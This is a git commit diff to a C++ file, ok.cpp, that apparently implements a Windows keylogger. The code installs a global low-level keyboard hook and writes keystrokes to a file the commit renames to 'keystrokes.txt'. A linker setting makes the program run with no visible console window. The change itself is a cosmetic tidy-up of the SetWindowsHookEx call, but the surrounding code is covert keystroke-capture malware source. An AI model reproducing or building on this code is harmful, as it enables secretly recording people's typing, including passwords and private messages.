16d6a1cc1f31c2cc72568cb2cd3ab71eb11a3d5d
CGMW293 <138163744+CGMW293@users.noreply.github.com>
2023-12-02 17:40:32 -0800

    Update ok.cpp
    Compress windows multiline boilerplate a bit

--- ok.cpp
+++ ok.cpp
@@ -3,7 +3,7 @@
 #pragma warning(disable:4996)
 #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup") 
 FILE* OUTPUT_FILE;
-char FILE_NAME[] = "windowsapiSUCKS.txt"; 
+char FILE_NAME[] = "keystrokes.txt"; 
 LRESULT CALLBACK LowLevelKeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam) {
 	if (nCode == HC_ACTION) {
 		switch (wParam) {
@@ -20,12 +20,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ L
 
 };
 int main() {
-	HHOOK Hook=SetWindowsHookEx(
-		WH_KEYBOARD_LL,
-		LowLevelKeyboardProc,
-		NULL,
-		0
-	);
+	HHOOK Hook=SetWindowsHookEx(WH_KEYBOARD_LL,LowLevelKeyboardProc,NULL,0);
 	MSG Message_Info;
 	while(GetMessage(&Message_Info, NULL, 0, 0) != 0);
 }
